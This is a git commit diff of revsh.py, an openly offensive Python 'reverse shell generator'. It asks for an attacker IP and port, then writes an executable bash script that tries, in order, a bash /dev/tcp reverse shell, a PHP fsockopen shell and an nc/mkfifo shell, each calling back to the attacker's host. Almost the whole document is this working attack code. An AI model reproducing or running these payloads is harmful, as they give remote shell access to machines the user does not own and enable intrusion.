e6d7a36d100ed61d218299f39302468967c20ba2
sidious <25933899+insidious-security@users.noreply.github.com>
2022-09-03 20:50:24 +0000

    updated revsh.py

--- revsh.py
+++ revsh.py
@@ -1,31 +1,51 @@
 #!/usr/bin/python
 #Author: sidious
+
 import os
 import sys
 
-ip = sys.argv[1]
-port = sys.argv[2]
-print("selected ip:",ip,"and port:",port)  
+def bAnner():
+  print('''
+
+██████  ███████ ██    ██ ███████ 
+██   ██ ██      ██    ██ ██      
+██████  █████   ██    ██ ███████ 
+██   ██ ██       ██  ██       ██ 
+██   ██ ███████   ████   ███████ 
+     - Reverse shell generator                            
+''')
 
 def shell():
-	file = open("rev", "w")
-	file.write("#!/bin/bash\n\n")
-	file.write("if command -v bash > /dev/null 2>&1; then\n")
-	file.write("  bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\n")
-	file.write("  exit;\n")
-	file.write("fi\n\n")
-	file.write("if command -v php > /dev/null 2>&1; then\n")
-	file.write("  php -r '$sock=fsockopen("+ip+","+port+");exec('/bin/sh -i <&3 >&3 2>&3');'\n")
-	file.write("  exit;\n")
-	file.write("fi\n\n")
-	file.write("if command -v nc > /dev/null 2>&1; then\n")
-	file.write("  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc "+ip+" "+port+" >/tmp/f \n")
-	file.write("  exit;\n")
-	file.write("fi\n\n")
-	file.close()
+
+  ip = input("IPAddress: ")
+  port = input("Port: ")
+  
+  if len(ip) < 1 or len(port) < 1:
+    print('[!] IP/Port required.')
+    exit(0)
+
+  print(f"selected ip: {ip} and port: {port}\n")  
+
+  file = open("rev", "w")
+  file.write(f'''#!/bin/bash\n
+if command -v bash > /dev/null 2>&1; then
+  bash -i >& /dev/tcp/{ip}/{port} 0>&1
+  exit;
+fi\n\n
+if command -v php > /dev/null 2>&1; then
+  php -r '$sock=fsockopen({ip},{port});exec('/bin/sh -i <&3 >&3 2>&3');'
+  exit;
+fi\n\n
+if command -v nc > /dev/null 2>&1; then
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f
+  exit;
+fi\n\n''')
+	
 
 def foofile():
 	os.popen("chmod +x rev")
 
-shell()
-foofile()
+if __name__ == '__main__':
+  bAnner()
+  shell()
+  foofile()
